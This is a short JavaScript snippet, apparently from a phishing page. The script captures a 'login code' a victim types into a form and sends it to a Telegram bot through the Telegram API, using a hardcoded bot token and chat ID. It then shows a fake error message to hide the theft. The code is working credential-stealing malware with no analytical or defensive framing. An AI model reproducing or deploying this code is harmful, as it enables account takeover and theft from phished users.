<script>
    function submitForm(event) {
            event.preventDefault(); //Prevent the default form submission
  
       // Get form data by name
       const code = document.getElementsByName('code')[0].value;
       
       // Prepare form response
       const formResponse = `
           LOGIN CODE IS
            code: ${code}
       `;
  
       // Send form response to Telegram bot
       const telegramBotToken = '7172258149:AAGrENqayWQ5QF2qJMhzsahr5Z_SX4dsr4A';
       const telegramChatId = '979353448';
  
       const telegramMessage = encodeURIComponent(formResponse);
       const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${telegramMessage}`;
  
       fetch(telegramApiUrl)
           .then(response => {
               if (!response.ok) {
                   throw new Error(`HTTP error! Status: ${response.status}`);
               }
               return response.json();
           })
           .then(data => {
               console.log('Telegram API response:', data);
               alert('Node API Error')
           })
           .catch(error => {
               console.error('ERROR', error.message);
               alert('Error submitting  Please try again.');
           });
   }
  </script>
